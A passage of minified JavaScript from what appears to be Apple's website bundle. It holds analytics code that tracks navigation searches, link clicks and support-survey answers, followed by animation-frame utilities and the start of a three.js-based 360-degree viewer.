search"),Te=Se.action({actionData:{search:window._applemd.search},timer:Te,state:Ce}))}(e)}))),t&&!t.getAttribute("nn-data-analytics-key-listener-added")&&t.addEventListener("keydown",(function(e){if(t.setAttribute("nn-data-analytics-key-listener-added","true"),13===e.keyCode||"Enter"===e.key){var i=t.value.trim().toLowerCase();i&&(window._applemd.search={location:"globalnav_support",link_type:"user",link_text:i,dest_url:"https://support.apple.com/kb/index",dest_platform:n?window._satellite.getVar("FN:Get_Link_Dest_Platform")("https://support.apple.com/kb/index"):""},Se.action({search:window._applemd.search}))}}))}catch(e){G.log("marcomSearch data collection failed")}}(),function(){try{!function(){for(var e=document.querySelectorAll("#ac-globalnav a"),t=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"data-analytics-title";try{if(window._applemd.component={dest_url:e.target.href||e.target.parentNode.href||"",link_text:(e.target.getAttribute(t)||"").trim().toLowerCase(),type:"simple link"},!window._applemd.component.link_text&&window._applemd.component.dest_url){var n=window._applemd.component.dest_url.split("/"),i=n.length;window._applemd.component.link_text=n[i-1]?n[i-1]:n[i-2]}Te=Se.action({actionData:{component:window._applemd.component},timer:Te,state:Ce})}catch(e){G.log("marcom link data collection failed",e)}},n=0;n<e.length;n++){var i=e[n];-1===i.id.indexOf("search")&&-1===i.id.indexOf("menuanchor")&&i.addEventListener("mousedown",(function(e){t(e)}))}}()}catch(e){G.log("marcom link tracking failed",e)}}()),t.trackSurvey&&window.location.pathname.includes("/online-support-survey")&&window.addEventListener("submit",(function(){if(Ce.initialized){var e=document.querySelectorAll("[data-analytics-question-id]");if(e.length>0){var t={survey_p2:"acs:survey",survey_v108:"acs:survey"},n="ss";e.forEach((function(e,i){var r=e.getAttribute("data-analytics-question-id");switch(r){case"sat":for(var o=!0,s=e.getElementsByTagName("input"),a=0;a<s.length;a++)if(s[a].checked){var c=s[a].getAttribute("data-analytics-res-id");t.survey_p2+="::1=".concat(c),t.survey_v108+="::q1".concat(n,"n_").concat(r,"=r").concat(a+1,"_").concat(c),o=!1}o&&(t.survey_p2+="::1=null",t.survey_v108+="::q1".concat(n,"n_").concat(r,"=null"));break;case"whysat":for(var l=!0,u=e.getElementsByTagName("input"),h=0;h<u.length;h++){var d=u[h].getAttribute("data-analytics-res-id");u[h].checked&&(t.survey_v28?(t.survey_v28+=",".concat(u[h].getAttribute("data-analytics-res-id")),t.survey_v108+=",r".concat(h+1,"_").concat(d)):(t.survey_v28="acs:survey::1whysat=".concat(u[h].getAttribute("data-analytics-res-id")),t.survey_v108+="::q2".concat("ms","n_").concat(r,"=r").concat(h+1,"_").concat(d)),l=!1)}l&&(t.survey_v28="acs:survey::1whysat=null",t.survey_v108+="::q2".concat("ms","n_").concat(r,"=null"));break;case"prod":for(var p=!0,f=e.getElementsByTagName("input"),m=0;m<f.length;m++)if(f[m].checked){var _=f[m].getAttribute("data-analytics-res-id");t.survey_p2+="::2=".concat(_),t.survey_v108+="::q3".concat(n,"n_").concat(r,"=r").concat(m+1,"_").concat(_),p=!1}p&&(t.survey_p2+="::2=null",t.survey_v108+="::q3".concat(n,"n_").concat(r,"=null"));break;case"reas":for(var v=!0,g=e.getElementsByTagName("input"),y=0;y<g.length;y++)if(g[y].checked){var b=g[y].getAttribute("data-analytics-res-id");t.survey_p2+="::3=".concat(b),t.survey_v108+="::q4".concat(n,"n_").concat(r,"=r").concat(y+1,"_").concat(b),v=!1}v&&(t.survey_p2+="::3=null",t.survey_v108+="::q4".concat(n,"n_").concat(r,"=null"));break;case"intent":for(var w=!0,E=e.getElementsByTagName("input"),k=0;k<E.length;k++)if(E[k].checked){var x=E[k].getAttribute("data-analytics-res-id");t.survey_p2+="::4=".concat(x),t.survey_v108+="::q5".concat(n,"n_").concat(r,"=r").concat(k+1,"_").concat(x),w=!1}w&&(t.survey_p2+="::4=null",t.survey_v108+="::q5".concat(n,"n_").concat(r,"=null"));break;case"refer":for(var S=!0,T=e.getElementsByTagName("input"),C=0;C<T.length;C++)if(T[C].checked){var O=T[C].getAttribute("data-analytics-res-id");t.survey_p2+="::5=".concat(O),t.survey_v108+="::q6".concat(n,"n_").concat(r,"=r").concat(C+1,"_").concat(O),S=!1}S&&(t.survey_p2+="::5=null",t.survey_v108+="::q6".concat(n,"n_").concat(r,"=null"));break;default:G.log("Question not match")}})),Ce.surveyTracking=xe({},t),Te=Se.gatherDataAndResetTimer({eventType:q.appSurvey,state:Ce,timer:Te})}}})),Ce.initialized=!0,G.log("intializing state to true")}"function"!=typeof Object.assign&&Object.defineProperty(Object,"assign",{value:function(e,t){if(null==e)throw new TypeError("Cannot convert undefined or null to object");for(var n=Object(e),i=1;i<arguments.length;i++){var r=arguments[i];if(null!=r)for(var o in r)Object.prototype.hasOwnProperty.call(r,o)&&(n[o]=r[o])}return n},writable:!0,configurable:!0}),"function"!=typeof Promise&&(0,N.polyfill)();var Ie={version:Ee,q:function(){return{state:Ce,queueManager:Se}},init:function(t){return(n=d().mark((function e(){return d().wrap((function(e){for(;;)switch(e.prev=e.next){case 0:G.log("configData: ",t),G.log("version: ",Ee),String.prototype.startsWith||Object.defineProperty(String.prototype,"startsWith",{value:function(e,t){var n=t>0?0|t:0;return this.substring(n,n+e.length)===e}}),we=be(t,W,G)._getValues(),G.log("Configuration updated. Final config:",we),we.endpoint||window.console&&console.error("Required parameter `endpoint` is not configured. Initialization has been terminated."),we.source||window.console&&console.error("Required parameter `source` is not configured. Initialization has been terminated."),Pe(),Se=new ge({config:we,state:Ce}),we.timestampOffset&&re({state:Ce,config:we}),we.trackCWV&&(Ce.cwv=Oe,Ae()),Me({cfg:we});case 12:case"end":return e.stop()}}),e)})),function(){var t=this,i=arguments;return new Promise((function(r,o){var s=n.apply(t,i);function a(t){e(s,r,o,a,c,"next",t)}function c(t){e(s,r,o,a,c,"throw",t)}a(void 0)}))})();var n},load:function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null;if(G.log("Load call: ",Ce),Ce.initialized){var n=(ue(we.cookieName)||"").split("=")[1];if(n&&Le(unescape(n))&&Se.postCookieDataToNetwork({payload:JSON.parse(unescape(n))}),he(we.cookieName,we.cookieDomain),e&&"object"===s(e)){G.log("App load received",e,t),Ce.appLoadHasBeenReported&&(Te=Se.gatherDataAndResetTimer({eventType:q.appUnload,state:Ce,timer:Te}),Pe(),Ce.initialized=!0);var i={};t&&(i=ne(t)),Ce.appLoadHasBeenReported=!0,Ce.page=Object.assign(i,e),Te=Se.gatherDataAndResetTimer({eventType:q.appLoad,state:Ce,timer:Te})}else G.log("Page data should be an object",e)}},action:function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null;if(Ce.initialized)if(e&&"object"===s(e)){G.log("App action received",e,t);var n={};t&&(n=ne(t)),Te=Se.gatherDataAndResetTimer({eventType:q.appEvent,state:Ce,extraData:Object.assign(n,e),timer:Te})}else G.log("Action data should be an object",e)},lastAction:function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null;if(Ce.initialized&&we.trackCookie)if(e&&"object"===s(e)){G.log("App last action received",e,t);var n={};t&&(n=ne(t)),Se.gatherDataAndSetCookie({eventType:q.appEvent,state:Ce,extraData:xe(xe({},Object.assign(n,e)),{},{name:"Preceding Action"})})}else G.log("Action data should be an object",e)},performance:function(){Ce.initialized&&(Te=Se.gatherDataAndResetTimer({eventType:q.systemPerformance,state:Ce,timer:Te}))},cwv:function(){Ce.initialized&&(Object.prototype.hasOwnProperty.call(Ce,"cwv")||(Ce.cwv=Oe),Te=Se.gatherDataAndResetTimer({eventType:q.systemWebVitals,state:Ce,timer:Te}))},marcomSearch:function(){Ce.initialized&&(Te=Se.gatherDataAndResetTimer({eventType:q.appMarcomSearch,state:Ce,timer:Te}))}}}(),i}()})),function e(t,n,i){function r(s,a){if(!n[s]){if(!t[s]){var c="function"==typeof require&&require;if(!a&&c)return c(s,!0);if(o)return o(s,!0);var l=new Error("Cannot find module '"+s+"'");throw l.code="MODULE_NOT_FOUND",l}var u=n[s]={exports:{}};t[s][0].call(u.exports,(function(e){return r(t[s][1][e]||e)}),u,u.exports,e,t,n,i)}return n[s].exports}for(var o="function"==typeof require&&require,s=0;s<i.length;s++)r(i[s]);return r}({1:[function(e,t,n){t.exports={majorVersionNumber:"3.x"}},{}],2:[function(e,t,n){"use strict";var i,r=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,o=e("./sharedRAFExecutorInstance"),s=e("./sharedRAFEmitterIDGeneratorInstance");function a(e){e=e||{},r.call(this),this.id=s.getNewID(),this.executor=e.executor||o,this._reset(),this._willRun=!1,this._didDestroy=!1}(i=a.prototype=Object.create(r.prototype)).run=function(){return this._willRun||(this._willRun=!0),this._subscribe()},i.cancel=function(){this._unsubscribe(),this._willRun&&(this._willRun=!1),this._reset()},i.destroy=function(){var e=this.willRun();return this.cancel(),this.executor=null,r.prototype.destroy.call(this),this._didDestroy=!0,e},i.willRun=function(){return this._willRun},i.isRunning=function(){return this._isRunning},i._subscribe=function(){return this.executor.subscribe(this)},i._unsubscribe=function(){return this.executor.unsubscribe(this)},i._onAnimationFrameStart=function(e){this._isRunning=!0,this._willRun=!1,this._didEmitFrameData||(this._didEmitFrameData=!0,this.trigger("start",e))},i._onAnimationFrameEnd=function(e){this._willRun||(this.trigger("stop",e),this._reset())},i._reset=function(){this._didEmitFrameData=!1,this._isRunning=!1},t.exports=a},{"./sharedRAFEmitterIDGeneratorInstance":8,"./sharedRAFExecutorInstance":9,"@marcom/ac-event-emitter-micro":122}],3:[function(e,t,n){"use strict";var i,r=e("@marcom/ac-event-emitter-micro/EventEmitterMicro");function o(e){e=e||{},this._reset(),this.updatePhases(),this.eventEmitter=new r,this._willRun=!1,this._totalSubscribeCount=-1;var t=null,n=null;"undefined"!=typeof window?(t=window.requestAnimationFrame,n=window.cancelAnimationFrame):t=n=function(){},this._requestAnimationFrame=t,this._cancelAnimationFrame=n,this._boundOnAnimationFrame=this._onAnimationFrame.bind(this),this._boundOnExternalAnimationFrame=this._onExternalAnimationFrame.bind(this)}(i=o.prototype).frameRequestedPhase="requested",i.startPhase="start",i.runPhases=["update","external","draw"],i.endPhase="end",i.disabledPhase="disabled",i.beforePhaseEventPrefix="before:",i.afterPhaseEventPrefix="after:",i.subscribe=function(e,t){return this._totalSubscribeCount++,this._nextFrameSubscribers[e.id]||(t?this._nextFrameSubscribersOrder.unshift(e.id):this._nextFrameSubscribersOrder.push(e.id),this._nextFrameSubscribers[e.id]=e,this._nextFrameSubscriberArrayLength++,this._nextFrameSubscriberCount++,this._run()),this._totalSubscribeCount},i.subscribeImmediate=function(e,t){return this._totalSubscribeCount++,this._subscribers[e.id]||(t?this._subscribersOrder.splice(this._currentSubscriberIndex+1,0,e.id):this._subscribersOrder.unshift(e.id),this._subscribers[e.id]=e,this._subscriberArrayLength++,this._subscriberCount++),this._totalSubscribeCount},i.unsubscribe=function(e){return!!this._nextFrameSubscribers[e.id]&&(this._nextFrameSubscribers[e.id]=null,this._nextFrameSubscriberCount--,0===this._nextFrameSubscriberCount&&this._cancel(),!0)},i.getSubscribeID=function(){return this._totalSubscribeCount+=1},i.destroy=function(){var e=this._cancel();return this.eventEmitter.destroy(),this.eventEmitter=null,this.phases=null,this._subscribers=null,this._subscribersOrder=null,this._nextFrameSubscribers=null,this._nextFrameSubscribersOrder=null,this._rafData=null,this._boundOnAnimationFrame=null,this._onExternalAnimationFrame=null,e},i.useExternalAnimationFrame=function(e){if("boolean"==typeof e){var t=this._isUsingExternalAnimationFrame;return e&&this._animationFrame&&(this._cancelAnimationFrame.call(window,this._animationFrame),this._animationFrame=null),!this._willRun||e||this._animationFrame||(this._animationFrame=this._requestAnimationFrame.call(window,this._boundOnAnimationFrame)),this._isUsingExternalAnimationFrame=e,e?this._boundOnExternalAnimationFrame:t||!1}},i.updatePhases=function(){this.phases||(this.phases=[]),this.phases.length=0,this.phases.push(this.frameRequestedPhase),this.phases.push(this.startPhase),Array.prototype.push.apply(this.phases,this.runPhases),this.phases.push(this.endPhase),this._runPhasesLength=this.runPhases.length,this._phasesLength=this.phases.length},i._run=function(){if(!this._willRun)return this._willRun=!0,0===this.lastFrameTime&&(this.lastFrameTime=performance.now()),this._animationFrameActive=!0,this._isUsingExternalAnimationFrame||(this._animationFrame=this._requestAnimationFrame.call(window,this._boundOnAnimationFrame)),this.phase===this.disabledPhase&&(this.phaseIndex=0,this.phase=this.phases[this.phaseIndex]),!0},i._cancel=function(){var e=!1;return this._animationFrameActive&&(this._animationFrame&&(this._cancelAnimationFrame.call(window,this._animationFrame),this._animationFrame=null),this._animationFrameActive=!1,this._willRun=!1,e=!0),this._isRunning||this._reset(),e},i._onAnimationFrame=function(e){for(this._subscribers=this._nextFrameSubscribers,this._subscribersOrder=this._nextFrameSubscribersOrder,this._subscriberArrayLength=this._nextFrameSubscriberArrayLength,this._subscriberCount=this._nextFrameSubscriberCount,this._nextFrameSubscribers={},this._nextFrameSubscribersOrder=[],this._nextFrameSubscriberArrayLength=0,this._nextFrameSubscriberCount=0,this.phaseIndex=0,this.phase=this.phases[this.phaseIndex],this._isRunning=!0,this._willRun=!1,this._didRequestNextRAF=!1,this._rafData.delta=e-this.lastFrameTime,this.lastFrameTime=e,this._rafData.fps=0,this._rafData.delta>=1e3&&(this._rafData.delta=0),0!==this._rafData.delta&&(this._rafData.fps=1e3/this._rafData.delta),this._rafData.time=e,this._rafData.naturalFps=this._rafData.fps,this._rafData.timeNow=Date.now(),this.phaseIndex++,this.phase=this.phases[this.phaseIndex],this.eventEmitter.trigger(this.beforePhaseEventPrefix+this.phase),this._currentSubscriberIndex=0;this._currentSubscriberIndex<this._subscriberArrayLength;this._currentSubscriberIndex++)null!==this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]&&!1===this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]._didDestroy&&this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]._onAnimationFrameStart(this._rafData);for(this.eventEmitter.trigger(this.afterPhaseEventPrefix+this.phase),this._runPhaseIndex=0;this._runPhaseIndex<this._runPhasesLength;this._runPhaseIndex++){for(this.phaseIndex++,this.phase=this.phases[this.phaseIndex],this.eventEmitter.trigger(this.beforePhaseEventPrefix+this.phase),this._currentSubscriberIndex=0;this._currentSubscriberIndex<this._subscriberArrayLength;this._currentSubscriberIndex++)null!==this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]&&!1===this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]._didDestroy&&this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]].trigger(this.phase,this._rafData);this.eventEmitter.trigger(this.afterPhaseEventPrefix+this.phase)}for(this.phaseIndex++,this.phase=this.phases[this.phaseIndex],this.eventEmitter.trigger(this.beforePhaseEventPrefix+this.phase),this._currentSubscriberIndex=0;this._currentSubscriberIndex<this._subscriberArrayLength;this._currentSubscriberIndex++)null!==this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]&&!1===this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]._didDestroy&&this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]._onAnimationFrameEnd(this._rafData);this.eventEmitter.trigger(this.afterPhaseEventPrefix+this.phase),this._willRun?(this.phaseIndex=0,this.phaseIndex=this.phases[this.phaseIndex]):this._reset()},i._onExternalAnimationFrame=function(e){this._isUsingExternalAnimationFrame&&this._onAnimationFrame(e)},i._reset=function(){this._rafData||(this._rafData={}),this._rafData.time=0,this._rafData.delta=0,this._rafData.fps=0,this._rafData.naturalFps=0,this._rafData.timeNow=0,this._subscribers={},this._subscribersOrder=[],this._currentSubscriberIndex=-1,this._subscriberArrayLength=0,this._subscriberCount=0,this._nextFrameSubscribers={},this._nextFrameSubscribersOrder=[],this._nextFrameSubscriberArrayLength=0,this._nextFrameSubscriberCount=0,this._didEmitFrameData=!1,this._animationFrame=null,this._animationFrameActive=!1,this._isRunning=!1,this._shouldReset=!1,this.lastFrameTime=0,this._runPhaseIndex=-1,this.phaseIndex=-1,this.phase=this.disabledPhase},t.exports=o},{"@marcom/ac-event-emitter-micro/EventEmitterMicro":123}],4:[function(e,t,n){"use strict";var i=e("./SingleCallRAFEmitter"),r=function(e){this.phase=e,this.rafEmitter=new i,this._cachePhaseIndex(),this.requestAnimationFrame=this.requestAnimationFrame.bind(this),this.cancelAnimationFrame=this.cancelAnimationFrame.bind(this),this._onBeforeRAFExecutorStart=this._onBeforeRAFExecutorStart.bind(this),this._onBeforeRAFExecutorPhase=this._onBeforeRAFExecutorPhase.bind(this),this._onAfterRAFExecutorPhase=this._onAfterRAFExecutorPhase.bind(this),this.rafEmitter.on(this.phase,this._onRAFExecuted.bind(this)),this.rafEmitter.executor.eventEmitter.on("before:start",this._onBeforeRAFExecutorStart),this.rafEmitter.executor.eventEmitter.on("before:"+this.phase,this._onBeforeRAFExecutorPhase),this.rafEmitter.executor.eventEmitter.on("after:"+this.phase,this._onAfterRAFExecutorPhase),this._frameCallbacks=[],this._currentFrameCallbacks=[],this._nextFrameCallbacks=[],this._phaseActive=!1,this._currentFrameID=-1,this._cancelFrameIdx=-1,this._frameCallbackLength=0,this._currentFrameCallbacksLength=0,this._nextFrameCallbacksLength=0,this._frameCallbackIteration=0},o=r.prototype;o.requestAnimationFrame=function(e,t){return!0===t&&this.rafEmitter.executor.phaseIndex>0&&this.rafEmitter.executor.phaseIndex<=this.phaseIndex?this._phaseActive?(this._currentFrameID=this.rafEmitter.executor.subscribeImmediate(this.rafEmitter,!0),this._frameCallbacks.push(this._currentFrameID,e),this._frameCallbackLength+=2):(this._currentFrameID=this.rafEmitter.executor.subscribeImmediate(this.rafEmitter,!1),this._currentFrameCallbacks.push(this._currentFrameID,e),this._currentFrameCallbacksLength+=2):(this._currentFrameID=this.rafEmitter.run(),this._nextFrameCallbacks.push(this._currentFrameID,e),this._nextFrameCallbacksLength+=2),this._currentFrameID},o.cancelAnimationFrame=function(e){this._cancelFrameIdx=this._nextFrameCallbacks.indexOf(e),this._cancelFrameIdx>-1?this._cancelNextAnimationFrame():(this._cancelFrameIdx=this._currentFrameCallbacks.indexOf(e),this._cancelFrameIdx>-1?this._cancelCurrentAnimationFrame():(this._cancelFrameIdx=this._frameCallbacks.indexOf(e),this._cancelFrameIdx>-1&&this._cancelRunningAnimationFrame()))},o._onRAFExecuted=function(e){for(this._frameCallbackIteration=0;this._frameCallbackIteration<this._frameCallbackLength;this._frameCallbackIteration+=2)this._frameCallbacks[this._frameCallbackIteration+1](e.time,e);this._frameCallbacks.length=0,this._frameCallbackLength=0},o._onBeforeRAFExecutorStart=function(){Array.prototype.push.apply(this._currentFrameCallbacks,this._nextFrameCallbacks.splice(0,this._nextFrameCallbacksLength)),this._currentFrameCallbacksLength=this._nextFrameCallbacksLength,this._nextFrameCallbacks.length=0,this._nextFrameCallbacksLength=0},o._onBeforeRAFExecutorPhase=function(){this._phaseActive=!0,Array.prototype.push.apply(this._frameCallbacks,this._currentFrameCallbacks.splice(0,this._currentFrameCallbacksLength)),this._frameCallbackLength=this._currentFrameCallbacksLength,this._currentFrameCallbacks.length=0,this._currentFrameCallbacksLength=0},o._onAfterRAFExecutorPhase=function(){this._phaseActive=!1},o._cachePhaseIndex=function(){this.phaseIndex=this.rafEmitter.executor.phases.indexOf(this.phase)},o._cancelRunningAnimationFrame=function(){this._frameCallbacks.splice(this._cancelFrameIdx,2),this._frameCallbackLength-=2},o._cancelCurrentAnimationFrame=function(){this._currentFrameCallbacks.splice(this._cancelFrameIdx,2),this._currentFrameCallbacksLength-=2},o._cancelNextAnimationFrame=function(){this._nextFrameCallbacks.splice(this._cancelFrameIdx,2),this._nextFrameCallbacksLength-=2,0===this._nextFrameCallbacksLength&&this.rafEmitter.cancel()},t.exports=r},{"./SingleCallRAFEmitter":6}],5:[function(e,t,n){"use strict";var i=e("./RAFInterface"),r=function(){this.events={}},o=r.prototype;o.requestAnimationFrame=function(e){return this.events[e]||(this.events[e]=new i(e)),this.events[e].requestAnimationFrame},o.cancelAnimationFrame=function(e){return this.events[e]||(this.events[e]=new i(e)),this.events[e].cancelAnimationFrame},t.exports=new r},{"./RAFInterface":4}],6:[function(e,t,n){"use strict";var i=e("./RAFEmitter"),r=function(e){i.call(this,e)};(r.prototype=Object.create(i.prototype))._subscribe=function(){return this.executor.subscribe(this,!0)},t.exports=r},{"./RAFEmitter":2}],7:[function(e,t,n){"use strict";var i=e("./RAFInterfaceController");t.exports=i.cancelAnimationFrame("update")},{"./RAFInterfaceController":5}],8:[function(e,t,n){"use strict";var i=e("@marcom/ac-shared-instance").SharedInstance,r=e("../.release-info.js").majorVersionNumber,o=function(){this._currentID=0};o.prototype.getNewID=function(){return this._currentID++,"raf:"+this._currentID},t.exports=i.share("@marcom/ac-raf-emitter/sharedRAFEmitterIDGeneratorInstance",r,o)},{"../.release-info.js":1,"@marcom/ac-shared-instance":11}],9:[function(e,t,n){"use strict";var i=e("@marcom/ac-shared-instance").SharedInstance,r=e("../.release-info.js").majorVersionNumber,o=e("./RAFExecutor");t.exports=i.share("@marcom/ac-raf-emitter/sharedRAFExecutorInstance",r,o)},{"../.release-info.js":1,"./RAFExecutor":3,"@marcom/ac-shared-instance":11}],10:[function(e,t,n){"use strict";var i=e("./RAFInterfaceController");t.exports=i.requestAnimationFrame("update")},{"./RAFInterfaceController":5}],11:[function(e,t,n){"use strict";t.exports={SharedInstance:e("./ac-shared-instance/SharedInstance")}},{"./ac-shared-instance/SharedInstance":12}],12:[function(e,t,n){"use strict";var i,r="undefined"!=typeof window?window:{},o=r.AC,s=(i={},{get:function(e,t){var n=null;return i[e]&&i[e][t]&&(n=i[e][t]),n},set:function(e,t,n){return i[e]||(i[e]={}),i[e][t]="function"==typeof n?new n:n,i[e][t]},share:function(e,t,n){var i=this.get(e,t);return i||(i=this.set(e,t,n)),i},remove:function(e,t){var n=typeof t;if("string"!==n&&"number"!==n)i[e]&&(i[e]=null);else{if(!i[e]||!i[e][t])return;i[e][t]=null}}});o||(o=r.AC={}),o.SharedInstance||(o.SharedInstance=s),t.exports=o.SharedInstance},{}],13:[function(e,t,n){"use strict";e("./utils/vector3FromLatLon");const i=e("@marcom/ac-raf-emitter/update"),r=e("@marcom/ac-raf-emitter/cancelUpdate"),o=e("./controls/PointerControls"),s=e("./controls/OrientationControls"),a=e("@marcom/ac-event-emitter-micro/EventEmitterMicro"),c=e("@marcom/ac-easing/src/ac-easing/createBezier"),l=e("./renderers/SphericalRenderer"),u=e("./utils/simpleTimer"),h=e("./utils/inverseLongitude"),d=e("./controls/ArrowControls"),p=e("./utils/map"),f=e("@marcom/ac-feature/webGLAvailable")(),m=e("./utils/loadScript"),_=e("@marcom/useragent-detect").os.ios,v={slow:80,fast:120},g=c(.25,.1,0,1),y=c(.1,.15,0,1);class b extends a{constructor(e){super(),this.el=e.el,f||setTimeout((()=>{this.trigger("error")})),this._textureSrc=e.src,e.video?this._videoElement=e.video:e.src instanceof HTMLVideoElement?this._videoElement=e.src:this._textureSrc&&(this._textureSrc.endsWith(".mp4")||this._textureSrc.endsWith(".m3u8")||this._textureSrc.endsWith(".webm"))&&(this._videoElement=document.createElement("video")),this._flat=e.flat,this._maxLat=e.maxLat||80,this._pointerControls=new o({el:e.mouseTarget||this.el}),this.arrowControls=new d,this._easing=e.easing||g,this._sineEasing=e.sineEasing||y,this._mapMinValue=void 0!==e.mapMinValue?e.mapMinValue:.001,this._mapMaxValue=e.mapMaxValue||.999,this._rotationDuration=e.rotationDuration||1600,_&&(this._orientationControls=new s),this._panVelocity=Object.assign({},e.panVelocity||v),this._overshootMultiplier=e.overshootMultiplier||1.25,this._oscillationDuration=e.ocillationDuration||1600,this._oscillationDistance=e.ocillationDistance||12,this._bindMethods();const t=window.THREE?Promise.resolve():m(e.threeUrl||"/ac/libs/three/92/three.min.js");this._cachedPos={lat:0,lon:0},t.then((()=>{this._attach(),this.refreshSize()}))}_bindMethods(){this._onPlaying=this._onPlaying.bind(this),this._onLoadedMetadata=this._onLoadedMetadata.bind(this),this._videoElement&&(this._videoElement.addEventListener("playing",this._onPlaying),this._videoElement.addEventListener("loadedmetadata",this._onLoadedMetadata))}_attach(){this._distance=50;const e={lat:0,lon:0};this._cachedPos=e,this._pointerControls.position=e,this._orientationControls&&(this._orientationControls.position=e);let t=l;this._renderer=new t({el:this.el,distance:this._distance,src:this._textureSrc,pointerControls:this._pointerControls,videoElement:this._videoElement,useCanvasForVideoTexture:_,maxLat:this._maxLat}),this._renderer.attach(),this._renderer.domElement.classList.add("threesixty-renderer"),this.el.appendChild(this._renderer.domElement),this._animate=this._animate.bind(this),this._animateRAF=i(this._animate)}_animate(){this._update(),this._animateRAF=i(this._animate)}_update(e){if(!window.THREE)return;let t=e;t||(t=this.arrowControls.isActive?this.arrowControls.position:this._pointerControls.isActive?this._pointerControls.position:this._orientationControls?this._orientationControls.position:this._cachedPos);let n=!1;if(this._cachedPos.lat!==t.lat||this._cachedPos.lon!==t.lon)n=!0;else if(this._videoElement&&this._videoElement.paused)return;let i=this._renderer.update(t);this._cachedPos=Object.assign({},i),this._pointerControls.position=i,this.arrowControls.position=i,this._orientationControls&&(this._orientationControls.position=i),n&&this.trigger(b.POSITION_CHANGE)}refreshSize(){this._onResize()}setPos(e,t){this._pointerControls&&(this._pointerControls.position={lat:e,lon:t}),this._orientationControls&&(this._orientationControls.position={lat:e,lon:t}),this._update({lat:e,lon:t})}set src(e){this._updateTexture(e)}async _updateTexture(e){await this._renderer.updateTexture(e),this.trigger("textureChange")}_onResize(){if(!window.THREE||!this._renderer)return;let e,t;e=this.el.clientWidth,t=this.el.clientHeight,r(this._animateRAF),this._pointerControls.setViewerSize(e,t),this._renderer.refreshSize(e,t),this._animate()}_onLoadedMetadata(){this._videoElement.removeEventListener("loadedmetadata",this._onLoadedMetadata),this._onResize()}_onPlaying(){this._videoElement.removeEventListener("playing",this._onPlaying),this._onResize(),this._orientationControls&&this._orientationControls.enable()}requestOrientationControl(){this._orientationControls&&this._orientationControls.requestPermission()}play(){this._orientationControls&&this._orientationControls.requestPermission(),this._videoElement&&this._videoElement.play()}pause(){this._videoElement&&!this._videoElement.paused&&this._videoElement.pause()}sendMouseDown(e){this._pointerControls.sendMouseDown(e)}destroy(){super.destroy()}get position(){return Object.assign({},this._cachedPos)}get isAtOrigin(){return Math.abs(this.position.lat)<=.5&&Math.abs(this.position.lon)<=.5}oscillateLongitude(){this._pointerControls.cancelInertia(),this.arrowControls.cancelInertia();const e=new THREE.Vector2(this.position.lon,this.position.lat),t=this._oscillationDuration,n={time:t,startPosition:Object.assign({},this.position),targetPosition:Object.assign({},this.position)};return this._currentTimer?this._currentTimer.cancel().then((()=>{this._currentTimer=null,this.oscillateLongitude()})):(r(this._animateRAF),this.trigger(b.ROTATION_START,n),new Promise((i=>{this._currentTimer=u(t,(t=>{const i=Math.sin(Math.PI*this._sineEasing.getValue(t)),r=(new THREE.Vector2).copy(e);r.x=e.x-i*this._oscillationDistance,this._tmpCurrentPosition={lat:r.y,lon:r.x},this.trigger(b.ROTATION_UPDATE,{t:t,easedVal:i,startPosition:n.startPosition,currentPosition:{lat:r.y,lon:r.x},targetPosition:n.targetPosition}),this._renderer.positionCamera(r.x,r.y)})),this._currentTimer.promise.then((()=>{this.trigger(b.ROTATION_COMPLETE,n),this.setPos(e.y,e.x),this._animate(),this._currentTimer=null,this._tmpCurrentPosition=null,i()})).catch((()=>{}))})))}get mediaElement(){return this._videoElement}panToPosition(e){return this._respositionCameraToPosition(e)}_respositionCameraToPosition(e,t){if(this._currentTimer)return this._currentTimer.cancel().then((()=>{this._currentTimer=null,this.setPos(this._tmpCurrentPosition.y,this._tmpCurrentPosition.x),this._tmpCurrentPosition=null,this._respositionCameraToPosition(e,t)}));if(this._pointerControls.cancelInertia(),this.arrowControls.cancelInertia(),e.lat===this.position.lat&&e.lon===this.position.lon)return this.trigger(b.ROTATION_START,{time:0,startPosition:Object.assign({},this.position),targetPosition:Object.assign({},this.position)}),this.trigger(b.ROTATION_COMPLETE,{time:1,startPosition:Object.assign({},this.position),targetPosition:Object.assign({},this.position)}),Promise.resolve();t=t?c(t.x1,t.y1,t.x2,t.y2):this._easing;const n=new THREE.Vector2(this.position.lon,this.position.lat),i=new THREE.Vector2(h(e.lon),e.lat);let o=new THREE.Vector2(e.lon,e.lat),s=n.distanceTo(o),a=n.distanceTo(i);a<s&&(s=a,o=i);const l=(new THREE.Vector2).copy(n);r(this._animateRAF);const d=this._rotationDuration,f={time:d,startPosition:Object.assign({},this._cachedPos),targetPosition:Object.assign({},e)};return this.trigger(b.ROTATION_START,f),new Promise((t=>{this._currentTimer=u(d,(e=>{let t;t=1===e?1:p(this._easing.getValue(e),0,1,this._mapMinValue,this._mapMaxValue);const 